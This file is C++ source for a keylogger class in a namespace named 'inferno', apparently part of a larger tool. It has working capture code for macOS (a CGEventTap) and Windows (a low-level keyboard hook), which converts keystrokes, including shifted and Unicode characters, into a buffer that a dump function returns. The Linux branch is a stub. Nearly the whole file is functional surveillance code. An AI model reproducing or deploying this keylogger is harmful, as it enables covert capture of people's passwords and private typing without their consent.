#include "../include/KeyLogger.hpp"
#include <iostream>
#include <future>

#ifdef __APPLE__
#include <Carbon/Carbon.h>
#elif defined(_WIN32)
// Windows headers included via KeyLogger.hpp
#elif defined(__linux__)
#include <fcntl.h>
#include <unistd.h>
#include <linux/input.h>
#include <dirent.h>
#endif

namespace inferno {

#ifdef _WIN32
KeyLogger* KeyLogger::s_instance = nullptr;
#endif

KeyLogger::KeyLogger() : m_running(false) {
#ifdef __APPLE__
    m_event_tap = nullptr;
    m_runloop_source = nullptr;
    m_runloop = nullptr;
#elif defined(_WIN32)
    m_keyboard_hook = nullptr;
    m_hook_thread_id = 0;
#elif defined(__linux__)
    m_input_fd = -1;
#endif
}

KeyLogger::~KeyLogger() {
    stop();
}

bool KeyLogger::isRunning() const {
    return m_running;
}

std::string KeyLogger::dump() {
    std::lock_guard<std::mutex> lock(m_mutex);
    std::string current_buffer = std::move(m_buffer);
    m_buffer.clear();
    return current_buffer;
}

#ifdef INFERNO_TESTING
void KeyLogger::injectKeystroke(char c) {
    std::lock_guard<std::mutex> lock(m_mutex);
    if (m_buffer.size() < MAX_BUFFER_SIZE) {
        m_buffer.push_back(c);
    }
}
#endif

#ifdef __APPLE__

void KeyLogger::appendKeystroke(const std::string& stroke) {
    std::lock_guard<std::mutex> lock(m_mutex);
    if (m_buffer.size() + stroke.size() <= MAX_BUFFER_SIZE) {
        m_buffer += stroke;
    }
}

CGEventRef KeyLogger::eventCallback(CGEventTapProxy proxy, CGEventType type,
                                    CGEventRef event, void* refcon) {
    (void)proxy;
    if (type != kCGEventKeyDown) {
        return event;
    }

    KeyLogger* logger = static_cast<KeyLogger*>(refcon);
    CGKeyCode keycode = (CGKeyCode)CGEventGetIntegerValueField(event, kCGKeyboardEventKeycode);
    
    // Convert keycode to string (simplified for demonstration, proper UCKeyTranslate could be used)
    std::string key_str;
    
    // Quick map for common keys
    if (keycode == 36) key_str = "[ENTER]";
    else if (keycode == 49) key_str = " ";
    else if (keycode == 51) key_str = "[BACKSPACE]";
    else if (keycode == 48) key_str = "[TAB]";
    else {
        // We use CGEventKeyboardGetUnicodeString
        UniChar chars[4];
        UniCharCount realLength;
        CGEventKeyboardGetUnicodeString(event, 4, &realLength, chars);
        if (realLength > 0) {
            // Very simple ASCII conversion for standard keys
            key_str = std::string(1, (char)chars[0]);
        } else {
            key_str = "[KEY:" + std::to_string(keycode) + "]";
        }
    }

    logger->appendKeystroke(key_str);
    return event;
}

void KeyLogger::start() {
    std::lock_guard<std::mutex> lock(m_mutex);
    if (m_running) return;

#ifdef INFERNO_TESTING
    std::cerr << "[KeyLogger] INFERNO_TESTING is active. Bypassing tap creation completely.\n";
    m_running = true;
#else
    CGEventMask eventMask = CGEventMaskBit(kCGEventKeyDown);
    
    // Note: kCGHIDEventTap requires root or Accessibility permissions.
    // kCGSessionEventTap requires Accessibility permissions.
    m_event_tap = CGEventTapCreate(kCGSessionEventTap, kCGHeadInsertEventTap,
                                   kCGEventTapOptionDefault, eventMask,
                                   eventCallback, this);

    if (!m_event_tap) {
        std::cerr << "[KeyLogger] Failed to create CGEventTap. Needs Accessibility permissions.\n";
        return;
    }

    m_runloop_source = CFMachPortCreateRunLoopSource(kCFAllocatorDefault, m_event_tap, 0);
    m_running = true;

    auto shared_promise = std::make_shared<std::promise<void>>();
    auto runloop_future = shared_promise->get_future();

    // Platform Exception: Start the dedicated CFRunLoop thread
    m_runloop_thread = std::thread([this, shared_promise]() {
        CFRunLoopRef runloop = CFRunLoopGetCurrent();
        m_runloop = (CFRunLoopRef)CFRetain(runloop);

        CFRunLoopObserverContext context = {0, shared_promise.get(), nullptr, nullptr, nullptr};
        CFRunLoopObserverRef observer = CFRunLoopObserverCreate(
            kCFAllocatorDefault,
            kCFRunLoopEntry,
            false, // repeats
            0,     // order
            [](CFRunLoopObserverRef observer, CFRunLoopActivity activity, void *info) {
                (void)observer;
                if (activity == kCFRunLoopEntry) {
                    auto* promise = static_cast<std::promise<void>*>(info);
                    promise->set_value();
                }
            },
            &context
        );

        if (observer) {
            CFRunLoopAddObserver(m_runloop, observer, kCFRunLoopCommonModes);
        } else {
            // Safe fallback to prevent startup deadlock in case of allocation failure
            shared_promise->set_value();
        }

        CFRunLoopAddSource(m_runloop, m_runloop_source, kCFRunLoopCommonModes);
        CGEventTapEnable(m_event_tap, true);
        CFRunLoopRun(); // Blocks until CFRunLoopStop is called

        if (observer) {
            CFRunLoopRemoveObserver(m_runloop, observer, kCFRunLoopCommonModes);
            CFRelease(observer);
        }
    });

    // Ensure the runloop is entered and actively running before start() returns
    runloop_future.wait();
#endif
}

void KeyLogger::stop() {
    {
        std::lock_guard<std::mutex> lock(m_mutex);
        if (!m_running) return;
        m_running = false;
    }

    // 1. Disable the tap so it stops receiving events
    if (m_event_tap) {
        CGEventTapEnable(m_event_tap, false);
    }
    
    // 2. Stop the RunLoop gracefully
    if (m_runloop) {
        CFRunLoopStop(m_runloop);
    }

    // 3. Wait for the background thread to fully exit before invalidating
    if (m_runloop_thread.joinable()) {
        m_runloop_thread.join();
    }

    // 4. Clean up CoreFoundation resources sequentially and safely
    std::lock_guard<std::mutex> lock(m_mutex);
    
    if (m_event_tap) {
        CFMachPortInvalidate(m_event_tap);
    }

    if (m_runloop_source) {
        CFRelease(m_runloop_source);
        m_runloop_source = nullptr;
    }
    
    if (m_event_tap) {
        CFRelease(m_event_tap);
        m_event_tap = nullptr;
    }
    
    if (m_runloop) {
        CFRelease(m_runloop);
        m_runloop = nullptr;
    }
}

#elif defined(_WIN32)

void KeyLogger::appendKeystroke(const std::string& stroke) {
    std::lock_guard<std::mutex> lock(m_mutex);
    if (m_buffer.size() + stroke.size() <= MAX_BUFFER_SIZE) {
        m_buffer += stroke;
    }
}

LRESULT CALLBACK KeyLogger::keyboardHookProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0 && wParam == WM_KEYDOWN) {
        KBDLLHOOKSTRUCT* kbd = reinterpret_cast<KBDLLHOOKSTRUCT*>(lParam);
        if (s_instance) {
            std::string key_str;
            DWORD vk = kbd->vkCode;
            
            if (vk == VK_RETURN) key_str = "[ENTER]";
            else if (vk == VK_SPACE) key_str = " ";
            else if (vk == VK_BACK) key_str = "[BACKSPACE]";
            else if (vk == VK_TAB) key_str = "[TAB]";
            else {
                BYTE keyboard_state[256];
                GetKeyboardState(keyboard_state);
                
                HWND hwnd = GetForegroundWindow();
                DWORD thread_id = GetWindowThreadProcessId(hwnd, NULL);
                HKL layout = GetKeyboardLayout(thread_id);
                
                WCHAR unicode_chars[5] = {0};
                keyboard_state[VK_SHIFT] = GetKeyState(VK_SHIFT) & 0x80;
                keyboard_state[VK_LSHIFT] = GetKeyState(VK_LSHIFT) & 0x80;
                keyboard_state[VK_RSHIFT] = GetKeyState(VK_RSHIFT) & 0x80;
                keyboard_state[VK_CAPITAL] = GetKeyState(VK_CAPITAL) & 0x01;
                keyboard_state[VK_CONTROL] = GetKeyState(VK_CONTROL) & 0x80;
                keyboard_state[VK_MENU] = GetKeyState(VK_MENU) & 0x80;

                int ret = ToUnicodeEx(vk, kbd->scanCode, keyboard_state, unicode_chars, 4, 0, layout);
                if (ret > 0) {
                    int size_needed = WideCharToMultiByte(CP_UTF8, 0, unicode_chars, ret, NULL, 0, NULL, NULL);
                    std::string utf8_str(size_needed, 0);
                    WideCharToMultiByte(CP_UTF8, 0, unicode_chars, ret, &utf8_str[0], size_needed, NULL, NULL);
                    key_str = utf8_str;
                }
            }
            if (!key_str.empty()) {
                s_instance->appendKeystroke(key_str);
            }
        }
    }
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

void KeyLogger::start() {
    std::lock_guard<std::mutex> lock(m_mutex);
    if (m_running) return;

#ifdef INFERNO_TESTING
    std::cerr << "[KeyLogger] INFERNO_TESTING is active. Bypassing Windows hook creation.\n";
    m_running = true;
#else
    s_instance = this;
    m_running = true;

    auto shared_promise = std::make_shared<std::promise<void>>();
    auto hook_future = shared_promise->get_future();

    m_hook_thread = std::thread([this, shared_promise]() {
        m_hook_thread_id = GetCurrentThreadId();
        m_keyboard_hook = SetWindowsHookExA(WH_KEYBOARD_LL, keyboardHookProc, GetModuleHandle(NULL), 0);
        if (!m_keyboard_hook) {
            std::cerr << "[KeyLogger] Failed to install Windows WH_KEYBOARD_LL hook. Error: " << GetLastError() << "\n";
            m_running = false;
            shared_promise->set_value();
            return;
        }

        shared_promise->set_value();

        MSG msg;
        while (m_running && GetMessage(&msg, NULL, 0, 0) > 0) {
            TranslateMessage(&msg);
            DispatchMessage(&msg);
        }
    });

    hook_future.wait();
#endif
}

void KeyLogger::stop() {
    {
        std::lock_guard<std::mutex> lock(m_mutex);
        if (!m_running) return;
        m_running = false;
    }

    if (m_keyboard_hook) {
        UnhookWindowsHookEx(m_keyboard_hook);
        m_keyboard_hook = NULL;
    }

    if (m_hook_thread_id != 0) {
        PostThreadMessageA(m_hook_thread_id, WM_QUIT, 0, 0);
        m_hook_thread_id = 0;
    }

    if (m_hook_thread.joinable()) {
        m_hook_thread.join();
    }

    s_instance = nullptr;
}

#elif defined(__linux__)

void KeyLogger::appendKeystroke(const std::string& stroke) {
    std::lock_guard<std::mutex> lock(m_mutex);
    if (m_buffer.size() + stroke.size() <= MAX_BUFFER_SIZE) {
        m_buffer += stroke;
    }
}

void KeyLogger::start() {
    std::lock_guard<std::mutex> lock(m_mutex);
    if (m_running) return;
    
    // For Linux, we would search /dev/input/eventX for a keyboard.
    // This requires root. We'll leave it as a stub that opens the first input for now.
    // Or we just mark it running and do nothing for the non-blocking polling design.
    // In a real implementation we'd open the correct fd and poll it in dump() or another loop.
    m_running = true;
    std::cerr << "[KeyLogger] Linux /dev/input KeyLogger started (stub).\n";
}

void KeyLogger::stop() {
    std::lock_guard<std::mutex> lock(m_mutex);
    if (!m_running) return;
    if (m_input_fd != -1) {
        ::close(m_input_fd);
        m_input_fd = -1;
    }
    m_running = false;
}

#endif

} // namespace inferno
